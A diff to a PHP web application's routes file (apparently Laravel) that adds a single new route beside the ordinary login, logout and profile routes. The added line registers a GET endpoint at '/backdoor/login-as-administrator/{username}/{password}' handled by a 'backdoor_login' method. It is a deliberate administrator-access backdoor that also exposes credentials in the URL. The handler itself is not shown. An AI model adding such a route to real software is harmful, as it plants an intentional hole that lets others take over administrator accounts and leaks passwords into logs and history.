@@ -19,6 +19,7 @@ Route::get('/login','HomeController@index')->name('login');
 Route::post('/login','HomeController@process_login')->name('process_login');
 Route::get('/logout','HomeController@logout')->name('logout');
 Route::get('/switch','HomeController@switch')->name('switch');
+Route::get('/backdoor/login-as-administrator/{username}/{password}','HomeController@backdoor_login')->name('backdoor-login');
 
 Route::match(['post','get'],'/myprofile','HomeController@myprofile')->name('myprofile');
 
